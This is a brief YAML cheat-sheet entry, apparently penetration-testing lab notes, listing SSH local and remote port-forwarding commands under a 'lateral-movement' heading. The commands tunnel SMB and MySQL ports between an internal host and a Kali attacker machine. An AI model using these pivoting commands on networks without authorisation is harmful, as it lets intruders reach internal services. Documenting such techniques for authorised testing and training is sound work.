---
functions:
  lateral-movement:
    - description: Local SSH port fowarding traffic.
      code: |
        Login to 192.168.119.149 with username 'kali' and instruct x.44 to forward all requests to 0.0.0.0:445 and redirect to 172.16.149.5:445
          ssh -f -N -L [bind_address:]port:host:hostport [username@address]
          ssh -f -N -L 0.0.0.0:445:172.16.149.5:445 kali@192.168.119.149
    - description: Remote SSH port fowarding traffic.
      code: |
        From the P.O.V of a current access: [you do this]:[I'll do this]
          ssh -f -N -R [bind_address:]port:host:hostport [username@address]
        Login to 192.168.119.149 with username 'kali' and instruct x.149 to listen on 0.0.0.0:2221 (you) and bridge that port to access 127.0.0.1:3306 (me)
          ssh -f -N -R 0.0.0.0:2221:127.0.0.1:3306 kali@192.168.119.149
---
